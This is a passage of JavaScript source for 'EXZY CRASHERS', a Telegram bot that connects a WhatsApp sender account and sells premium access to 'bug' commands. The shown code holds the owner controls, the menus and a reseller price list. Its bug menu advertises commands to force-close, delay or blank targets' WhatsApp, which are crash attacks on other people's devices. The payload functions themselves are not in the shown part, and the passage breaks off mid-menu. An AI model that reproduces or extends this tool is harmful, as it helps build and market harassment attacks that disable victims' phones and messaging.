            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>`;


    const keyboard = [
        [
            {
                text: "⌜𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5424942942122964312"
            },
            {
                text: "⌜𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘⌟",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5465369102753229997"
            }
        ],
        [
            {
                text: "⌜𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔⌟",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5465206035729906349"
            },
            {
                text: "⌜𝗦𝗨𝗣𝗣𝗢𝗥𝗧⌟",
                callback_data: "/tqto", style: "danger", icon_custom_emoji_id: "5465631933276910444"
            },  
        ],
        [
            {
                text: "⌜𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥⌟",
                url: "https://t.me/ikkyexzy", style: "success", icon_custom_emoji_id: "5463182311564536761"
            },
            {
                text: "⌜𝗖𝗛𝗔𝗡𝗡𝗘𝗟⌟",
                url: "https://t.me/infoexzy", style: "success", icon_custom_emoji_id: "5197429921634346862"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5424942942122964312"
            },
            {
                text: "⌜𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘⌟",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5465369102753229997"
            }
        ],
        [
            {
                text: "⌜𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔⌟",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5465206035729906349"
            },
            {
                text: "⌜𝗦𝗨𝗣𝗣𝗢𝗥𝗧⌟",
                callback_data: "/tqto", style: "danger", icon_custom_emoji_id: "5465631933276910444"
            },
        ],
        [
            {
                text: "⌜𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥⌟",
                url: "https://t.me/ikkyexzy", style: "success", icon_custom_emoji_id: "5463182311564536761"
            },
            {
                text: "⌜𝗖𝗛𝗔𝗡𝗡𝗘𝗟⌟",
                url: "https://t.me/infoexzy", style: "success", icon_custom_emoji_id: "5197429921634346862"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 𝗣𝗔𝗚𝗘 𝟭/𝟯 ⌟
┊✦ /Romance - Exzy To Forclose
┊☇ [not work all devices]
┊✦ /Exzcry - Exzy To Delay
┊☇ [not work all devices]
┊✦ /Maklu - Exzy To Blank
┊☇ [not work all devices]
┊✦ /ExzyV -  Exzy To Combo
┊☇ [not work all devices]
┊✦ /testfunction - Use Your Own Function
┊☇ [test function]
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }, 
            {
                text: "⌜𝗡𝗘𝗫𝗧 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/bug2", style: "primary", icon_custom_emoji_id: "5197255369868470504"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/harga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP SC : 5K
┊✦ RESELLER SC : 10K
┊✦ PARTNER SC : 20K
┊✦ TANGAN KANAN SC : 30K
┊✦ OWNER SC : 40K
┊✦ HIGH OWNER SC : 50K
┊✦ STAFF SC : 60K
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 ⌟
┊✦ FULL UP TO RESS : 10K
┊✦ RESELLER TO PT 10K
┊✦ PARTNER TO TK : 10K
┊✦ FULL UP TO PT : 25K
┊✦ RESELLER TO TK : 25K
┊✦ PARTNER TO OWN : 20K
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 4.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘKedua orang tua gua
┊ ⓘMy GF
┊ ⓘMy Friends
┊ ⓘMy Partner
┊ ⓘAll Pelanggan
┊ ⓘAll Haters
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug2', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
